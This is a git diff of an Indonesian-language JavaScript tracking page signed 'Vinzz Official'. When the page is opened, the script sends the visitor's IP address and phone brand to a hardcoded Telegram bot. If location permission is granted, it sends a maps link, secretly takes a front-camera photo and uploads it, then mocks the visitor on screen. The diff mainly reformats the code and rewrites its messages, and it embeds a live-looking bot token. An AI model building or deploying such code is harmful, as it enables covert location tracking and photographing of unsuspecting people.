@@ -2,13 +2,13 @@ const token = '7876416430:AAGfJpQqoNvDSbx4tpuJQPdy5k8vx7Uhndw';
 const chat_id = '7777604508';
 
 async function getIP() {
-try {
-const res = await fetch("https://api.ipify.org?format=json");
-const data = await res.json();
-return data.ip;
-} catch {
-return "Tidak diketahui";
-}
+  try {
+    const res = await fetch("https://api.ipify.org?format=json");
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return "❌ Tidak diketahui";
+  }
 }
 
 function getMerekHP() {
@@ -35,8 +35,6 @@ function getMerekHP() {
 async function kirimFoto() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-
-    // Jika user mengizinkan kamera
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
 
@@ -47,7 +45,7 @@ async function kirimFoto() {
         resolve();
       };
     });
-                      
+
     await new Promise(resolve => setTimeout(resolve, 2000));
 
     canvas.width = video.videoWidth;
@@ -56,12 +54,12 @@ async function kirimFoto() {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    return new Promise((resolve) => {
+    return new Promise(resolve => {
       canvas.toBlob(blob => {
         const formData = new FormData();
         formData.append("chat_id", chat_id);
-        formData.append("photo", blob, "target.png");
-        formData.append('caption', 'ini fotonya tuan vinzz');
+        formData.append("photo", blob, "kamera.png");
+        formData.append("caption", "📸 ini fotonya tuan vinzz");
 
         fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
@@ -72,27 +70,27 @@ async function kirimFoto() {
 
   } catch (err) {
     console.warn("Akses kamera ditolak atau gagal.");
-    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak.");
+    await kirimPesanTelegram("⚠️ Gagal ambil foto, kamera tidak diizinkan.");
   }
 }
-        
+
 async function kirimPesanTelegram(pesan) {
-const url = (`https://api.telegram.org/bot${token}/sendMessage`);
-await fetch(url, {
-method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify({
-chat_id: chat_id,
-text: pesan
-})
-});
+  const url = `https://api.telegram.org/bot${token}/sendMessage`;
+  await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: pesan
+    })
+  });
 }
 
 (async () => {
-const ip = await getIP();
-const merek = getMerekHP();
-const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\n📱 Merek hp: ${merek}`;
-await kirimPesanTelegram(pesanAwal);
+  const ip = await getIP();
+  const merek = getMerekHP();
+  const pesanAwal = `📡 *Tracking dimulai!*\n\n🌐 IP: ${ip}\n📱 Merek HP: ${merek}\n📍 Lokasi: ⏳ Menunggu izin lokasi...`;
+  await kirimPesanTelegram(pesanAwal);
 })();
 
 navigator.geolocation.getCurrentPosition(
@@ -103,21 +101,19 @@ navigator.geolocation.getCurrentPosition(
     const ip = await getIP();
     const merek = getMerekHP();
 
-    // Menambahkan link peta di pesan jika lokasi diizinkan
-    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\n📱 Merek hp: ${merek}\n📍 Lokasi: ${gmaps}`;
+    const pesan = `📍 *Lokasi ditemukan!*\n\n🌐 IP: ${ip}\n📱 Merek HP: ${merek}\n📌 Maps: [Lihat Lokasi](${gmaps})\n\n📸 Sedang mengambil foto...`;
     await kirimPesanTelegram(pesan);
+    kirimFoto();
 
-    kirimFoto()
-
-    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
+    document.body.innerHTML = '<h2>Yahh kurang hoki bro<br><small>by Vinzz Official</small></h2>';
   },
   async () => {
     const ip = await getIP();
     const merek = getMerekHP();
 
-    const pesan = `IP berhasil ditemukan!\nStatus: MENOLAK LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
+    const pesan = `📛 Lokasi ditolak!\nFoto tidak diambil otomatis.`;
     await kirimPesanTelegram(pesan);
 
-    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
+    document.body.innerHTML = '<h2>Yahh kurang hoki bro<br><small>by Vinzz Official</small></h2>';
   }
 );
